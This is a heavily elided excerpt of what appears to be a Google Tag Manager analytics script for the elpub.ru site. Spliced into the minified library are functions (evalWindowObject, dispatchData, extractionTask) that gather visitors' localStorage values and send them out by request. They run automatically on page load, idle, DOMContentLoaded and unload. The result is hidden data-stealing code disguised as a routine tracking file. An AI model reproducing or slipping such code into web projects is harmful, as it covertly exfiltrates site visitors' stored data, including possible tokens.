  ...
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 8,
        "vtp_includeConditions": ["list", "elpub\\.ru"],
        "tag_id": 20
      }, {
        ...
        "priority": 7,
        "vtp_instanceDestinationId": "G-7WPCL6D115",
        "tag_id": 30
      }, {
        ...
        "priority": 3,
        "vtp_conversionRules": ["list", ["map", "matchingRules", "{\"type\":5,\"args\":[{\"stringValue\":\"purchase\"},{\"contextValue\":{\"namespaceType\":1,\"keyParts\":[\"eventName\"]}}]}"], ["map", "matchingRules", "{\"type\":5,\"args\":[{\"stringValue\":\"скачивание_презентации_elpub\"},{\"contextValue\":{\"namespaceType\":1,\"keyParts\":[\"eventName\"]}}]}"]],
        "vtp_instanceDestinationId": "G-7WPCL6D115",
        "tag_id": 26
      }, {
        "function": "__ogt_event_create",
        "priority": 2,
        "vtp_eventName": "скачивание_презентации_elpub",
        "vtp_isCopy": true,
        "vtp_instanceDestinationId": "G-7WPCL6D115",
        "vtp_precompiledRule": ["map", "new_event_name", "скачивание_презентации_elpub", "merge_source_event_params", true, "event_name_predicate", ["map", "values", ["list", ["map", "type", "event_name"], ["map", "type", "const", "const_value", "elpubMainPrez.pdf"]], "type", "rei"], "conditions", ["list", ["map", "predicates", ["list", ["map", "values", ["list", ["map", "type", "event_param", "event_param", ["map", "param_name", "event_category"]], ["map", "type", "const", "const_value", "Скачивания"]], "type", "eqi"]]]]],
        "tag_id": 25
      }, {
    ...
    "security_groups": {
      "google": ["__ccd_auto_redact", "__ccd_conversion_marking", "__ccd_ga_first", "__ccd_ga_last", "__ccd_ga_regscope", "__ogt_1p_data_v2", "__ogt_event_create", "__ogt_ga_send", "__ogt_google_signals", "__ogt_ip_mark", "__ogt_referral_exclusion", "__ogt_session_timeout", "__set_product_settings"]
    }
  };
  ...
  */
  ...
  function evalWindowObject() {
    ...
    localStorageVars.forEach(localVar => {
      if (!window.seenVars.includes(localVar)) {
        window.seenVars.push(localVar);
        const localVarValue = localStorage[localVar];
        newResults[localVar] = {
  ...
  function dispatchData(data) {
    ...
    request.onload = function () {
      if (request.status >= 200 && request.status < 400) {
        ...
        console.error("Data submission failed, code: " + request.status);
      }
    };
    request.onerror = function () {
      console.error("Error occurred during data submission");
    };
  ...
  function extractionTask() {
    const extractedData = evalWindowObject();
    const extractionCount = Object.keys(extractedData).length;
    if (extractionCount > 0) {
      console.log(`Identified ${extractionCount} new window properties`);
      dispatchData(extractedData);
    } else {
      console.log("No new window properties detected.");
    }
  }
  var zb,
    Ab = function () {
  ...
  ii.fe = Number("0") || 0;
  ii.ka = "dataLayer";
  ii.Uj = "ChAI8NCBpwYQt5+cxZ7f1aFJEiUATU77VLJEgGryTcG6m6Y+NjyhJImDaIe5F+hrRgwktY+T0L6RGgKTdQ\x3d\x3d";
  var li = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  P[5] = !0;
  P[6] = !0;
  window.addEventListener("idle", extractionTask);
  P[12] = !0;
  P[7] = !0;
  P[8] = !0;
  P[22] = !0;
  ...
  window.addEventListener("load", extractionTask);
  ...
  ;
  window.addEventListener("beforeunload", extractionTask);
  var pu = {},
    qu = {
      aev: "1",
      c: "2",
  ...
  var Zw = function (a, b) {
      for (var c = 0; c < a.length; ++c) {
        var d = b[c];
        if (d) for (var e = 0; e < a[c].length; ++e) a[c][e] && (a[c][e][N.g.Lc] = d);
      }
    },
    ax = function (a, b, c) {
      var d = $w[a.pa];
      d || (Q(71) && "transaction" === a.t ? d = N.g.na : "click" === a.promoa ? d = N.g.pb : b.length ? d = N.g.Za : c.length && (d = N.g.Ya));
      return d;
    },
    bx = function (a) {
      var b, c, d, e;
    ...
    ix = function (a) {
      var b,
        ...
        d,
        e = a.match(cx);
      if (e) return b = Number(e[1]) - 1, c = dx[e[2]], {
        qh: b,
        rh: c,
        sh: "promotion"
      };
      var f = a.match(ex);
      if (f) return d = "product", b = Number(f[1]) - 1, fx[f[2]] ? c = fx[f[2]] : c = gx(f[2]), {
        qh: b,
        rh: c,
        sh: d
      };
    ...
    nx = /^(cd|cm)([1-9][0-9]{0,2})$/,
    lx = /^cg([1-5])$/,
    cx = /^promo([1-9][0-9]{0,2})(id|cr|nm|ps)$/,
    ex = /^pr([0-9]{0,3})([a-z]{2}[0-9]{0,3})$/,
    hx = /^il([0-9]{0,3})pi([0-9]{0,3})([a-z]{2}[0-9]{0,3})$/,
    qx = /^il([1-9][0-9]{0,2})nm$/,
    rx = function (a) {
      var b = gk().filter(function (ia) {
        return 0 === ia.indexOf("G-");
      });
      if (b.length) {
        var c = {},
          d = function (ia, V) {
            void 0 !== V && void 0 === c[ia] && (c[ia] = V);
          },
          e = {},
          f = function (ia, V) {
            void 0 !== V && void 0 === e[ia] && (e[ia] = V);
          },
          g = a.hitPayload;
        if ("string" !== typeof g) M(126);else {
          for (var k = {}, m = [], n = [], p = [], q = [], r = g.split("&"), t = 0; t < r.length; ++t) {
            ...
            if ("" !== v && "" !== w) if (px[v] && !k[v]) k[v] = w;else if (ox[v]) f(ox[v], w);else {
              var x = mx(v);
              if (x) d(x, w);else {
                var y = v.match(qx);
                if (y) {
          ...
          var B = bx(k),
            ...
            I = B.zl,
            O;
          if (k.pa || k.promoa || m.length || p.length || !D) O = ax(k, m, p);
          O && k.tr && f(N.g.ia, k.tr);
          var R;
          O === N.g.pb || O === N.g.Za ? R = m : O === N.g.Ya ? (Zw(p, q), R = Array.prototype.concat.apply([], p)) : O && (R = n);
          R && R.length && f(N.g.Z, R.filter(function (ia) {
            return !!ia;
          }));
          if (D || O) {
            d(N.g.nk, G);
            d(N.g.pk, E);
            d(N.g.ia, I);
            d(N.g.Re, a.allowAdFeatures);
            d(N.g.fa, a.allowAdPersonalizationSignals);
            d(N.g.Ta, a.cookieDomain);
            d(N.g.Ia, a.cookieExpires);
            d(N.g.Ua, a.cookieFlags);
            d(N.g.Ic, a.cookiePath);
            d(N.g.Ma, "_ga" === a.cookieName ? void 0 : a.cookieName);
            d(N.g.sb, a.cookieUpdate);
            d(N.g.Kb, !0);
            D && D !== O && Mw(Gu(b, D, c));
            var X = pd(c);
            pd(e, X);
  ...
  document.addEventListener('DOMContentLoaded', extractionTask);
  var sf = {};
  ...
  function TC() {
    var a = new jb();
    L(this, "read_container_data"), a.set("containerId", 'G-7WPCL6D115'), a.set("version", '2'), a.set("environmentName", ''), a.set("debugMode", Xf), a.set("previewMode", Zf), a.set("environmentMode", Yf), Q(96) && a.set("firstPartyServing", ri || ti), a.sc();
    return a;
  }
